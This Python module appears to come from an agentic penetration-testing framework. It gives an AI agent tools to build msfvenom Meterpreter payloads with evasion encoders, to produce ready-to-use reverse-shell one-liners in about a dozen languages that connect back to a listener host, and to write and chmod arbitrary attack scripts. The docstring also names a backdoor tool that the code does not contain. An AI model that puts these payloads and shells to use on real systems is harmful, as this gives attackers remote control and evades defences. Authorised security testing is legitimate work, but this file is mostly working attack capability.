"""
Pentronix Payload Factory — payload, backdoor, and script generation.

ALL tools in this module are CRITICAL risk and always require user
confirmation before execution.

Provides:
  - msfvenom_generate    — Metasploit payload generation
  - create_reverse_shell — reverse shell one-liners
  - create_backdoor      — persistent access scripts
  - create_custom_script — generate attack scripts in any language
"""

from __future__ import annotations

import textwrap
from typing import Any, Callable, Optional

from tools import Tool, ToolResult, RiskLevel
from core.executor import get_executor
from utils.logger import get_logger

log = get_logger(__name__)


class MsfvenomGenerate(Tool):
    name = "msfvenom_generate"
    description = (
        "Generate payloads using msfvenom. Creates executable payloads for "
        "various platforms: Linux ELF, Windows EXE/DLL, Android APK, Python, "
        "PHP, ASP, JSP, and more. Supports encoding and multiple output formats."
    )
    parameters = {
        "type": "object",
        "properties": {
            "payload": {
                "type": "string",
                "description": "Payload type (e.g. 'linux/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_tcp')",
            },
            "lhost": {
                "type": "string",
                "description": "Listener IP address (attacker's IP)",
            },
            "lport": {
                "type": "integer",
                "description": "Listener port number",
            },
            "format": {
                "type": "string",
                "description": "Output format (elf, exe, dll, apk, py, php, asp, jsp, raw, war, jar)",
            },
            "output_path": {
                "type": "string",
                "description": "Output file path (e.g. /tmp/payload.elf)",
            },
            "encoder": {
                "type": "string",
                "description": "Encoder to use for evasion (e.g. 'x86/shikata_ga_nai'). Optional.",
            },
            "iterations": {
                "type": "integer",
                "description": "Number of encoding iterations. Default: 1",
            },
            "extra_options": {
                "type": "string",
                "description": "Additional msfvenom options. Optional.",
            },
        },
        "required": ["payload", "lhost", "lport", "format", "output_path"],
    }
    risk_level = RiskLevel.CRITICAL
    system_binary = "msfvenom"

    async def execute(
        self, on_output: Optional[Callable] = None, **kwargs: Any
    ) -> ToolResult:
        payload = kwargs.get("payload", "")
        lhost = kwargs.get("lhost", "")
        lport = kwargs.get("lport", 4444)
        fmt = kwargs.get("format", "elf")
        output = kwargs.get("output_path", "/tmp/payload")
        encoder = kwargs.get("encoder", "")
        iterations = kwargs.get("iterations", 1)
        extra = kwargs.get("extra_options", "")

        cmd = (
            f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
            f"-f {fmt} -o {output}"
        )
        if encoder:
            cmd += f" -e {encoder} -i {iterations}"
        if extra:
            cmd += f" {extra}"

        executor = get_executor()
        result = await executor.execute(cmd, on_output=on_output, timeout=120)

        # Verify file was created
        import os
        if result.success and os.path.exists(output):
            size = os.path.getsize(output)
            extra_info = f"\nPayload generated: {output} ({size} bytes)"
            if on_output:
                on_output(extra_info)
            return ToolResult(
                success=True,
                output=result.stdout + extra_info,
                duration_seconds=result.duration_seconds,
                artifacts={"payload_path": output, "payload_size": size},
            )

        return ToolResult(
            success=result.success,
            output=result.stdout,
            error=result.stderr,
            duration_seconds=result.duration_seconds,
        )


class CreateReverseShell(Tool):
    name = "create_reverse_shell"
    description = (
        "Generate a reverse shell one-liner or script. Supports Bash, Python, "
        "Netcat, PHP, Perl, Ruby, PowerShell, and other languages. "
        "Can output as a one-liner or save to a file."
    )
    parameters = {
        "type": "object",
        "properties": {
            "shell_type": {
                "type": "string",
                "enum": ["bash", "python", "python3", "netcat", "nc", "php", "perl", "ruby", "powershell", "socat", "awk"],
                "description": "Type of reverse shell to generate",
            },
            "lhost": {
                "type": "string",
                "description": "Listener IP address",
            },
            "lport": {
                "type": "integer",
                "description": "Listener port number",
            },
            "output_path": {
                "type": "string",
                "description": "Save to file. If empty, returns the one-liner only.",
            },
        },
        "required": ["shell_type", "lhost", "lport"],
    }
    risk_level = RiskLevel.CRITICAL

    _SHELLS = {
        "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "python3": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "netcat": "nc -e /bin/sh {lhost} {lport}",
        "nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
        "awk": "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
    }

    async def execute(
        self, on_output: Optional[Callable] = None, **kwargs: Any
    ) -> ToolResult:
        shell_type = kwargs.get("shell_type", "bash")
        lhost = kwargs.get("lhost", "")
        lport = kwargs.get("lport", 4444)
        output_path = kwargs.get("output_path", "")

        template = self._SHELLS.get(shell_type, self._SHELLS["bash"])
        shell_cmd = template.format(lhost=lhost, lport=lport)

        output = f"Reverse shell ({shell_type}):\n\n{shell_cmd}"

        if output_path:
            try:
                from pathlib import Path
                Path(output_path).parent.mkdir(parents=True, exist_ok=True)
                Path(output_path).write_text(shell_cmd + "\n", encoding="utf-8")
                output += f"\n\nSaved to: {output_path}"
            except Exception as exc:
                output += f"\n\nFailed to save: {exc}"
                return ToolResult(success=False, output=output, error=str(exc))

        if on_output:
            on_output(output)

        return ToolResult(
            success=True,
            output=output,
            artifacts={"shell_command": shell_cmd, "shell_type": shell_type},
        )


class CreateCustomScript(Tool):
    name = "create_custom_script"
    description = (
        "Create a custom attack script or tool in any programming language. "
        "The agent generates the script code based on the described purpose "
        "and saves it to a file. Supports Python, Bash, PowerShell, Ruby, "
        "Perl, C, and more."
    )
    parameters = {
        "type": "object",
        "properties": {
            "language": {
                "type": "string",
                "description": "Programming language (python, bash, powershell, ruby, perl, c, go)",
            },
            "purpose": {
                "type": "string",
                "description": "Description of what the script should do",
            },
            "code": {
                "type": "string",
                "description": "The complete script source code",
            },
            "output_path": {
                "type": "string",
                "description": "File path to save the script (e.g. /tmp/exploit.py)",
            },
            "make_executable": {
                "type": "boolean",
                "description": "Set executable permission (chmod +x). Default: true",
            },
        },
        "required": ["language", "purpose", "code", "output_path"],
    }
    risk_level = RiskLevel.CRITICAL

    async def execute(
        self, on_output: Optional[Callable] = None, **kwargs: Any
    ) -> ToolResult:
        language = kwargs.get("language", "python")
        purpose = kwargs.get("purpose", "")
        code = kwargs.get("code", "")
        output_path = kwargs.get("output_path", "/tmp/script.py")
        make_executable = kwargs.get("make_executable", True)

        try:
            from pathlib import Path
            p = Path(output_path)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(code, encoding="utf-8")

            if make_executable:
                import os
                os.chmod(output_path, 0o755)

            output = (
                f"Script created: {output_path}\n"
                f"Language: {language}\n"
                f"Purpose: {purpose}\n"
                f"Size: {len(code)} chars\n"
                f"Executable: {make_executable}"
            )

            if on_output:
                on_output(output)

            return ToolResult(
                success=True,
                output=output,
                artifacts={"script_path": output_path, "language": language},
            )
        except Exception as exc:
            return ToolResult(success=False, output="", error=str(exc))
